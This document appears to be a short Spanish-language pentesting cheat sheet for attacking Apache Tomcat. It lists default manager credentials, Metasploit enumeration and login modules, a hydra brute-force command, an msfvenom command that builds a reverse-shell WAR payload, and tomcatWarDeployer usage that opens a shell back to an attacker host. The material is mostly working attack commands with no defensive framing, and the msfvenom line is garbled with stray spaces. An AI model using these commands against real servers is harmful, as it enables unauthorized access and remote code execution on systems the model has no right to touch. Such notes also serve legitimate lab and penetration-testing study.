# EXPLOITING APACHE TOMCAT
ejemplo de explotacion: [[BLACKBOX 1]]

[[Tomcat Explotation]]

**posible enumeracion de usuarios segun la version**

```bash
use auxiliary/scanner/http/tomcat_enum
```

**credenciales por defecto**

-   admin:admin
-   tomcat:tomcat
-   admin:\<NOTHING\>
-   admin:s3cr3t
-   tomcat:s3cr3t
-   admin:tomcat

podemos probar esto con mas valores usando este auxiliar:

```bash
use auxiliary/scanner/http/tomcat_mgr_login
```

Otra ruta **interesante de Tomcat** es **/manager/status** , donde puede ver la versión del sistema operativo y Tomcat. Esto es útil para encontrar vulns que afecten a la versión de Tomcat cuando no puede acceder a **	/manager/html**

**fuerza bruta con hydra**

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

**payload war**

```bash
msfvenom -p java / jsp_shell_reverse_tcp LHOST = 10.11 .0.41 LPORT = 80 -f war -o revshell.war
```

**tomcatWarDeployer.py**

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git

./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/

./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```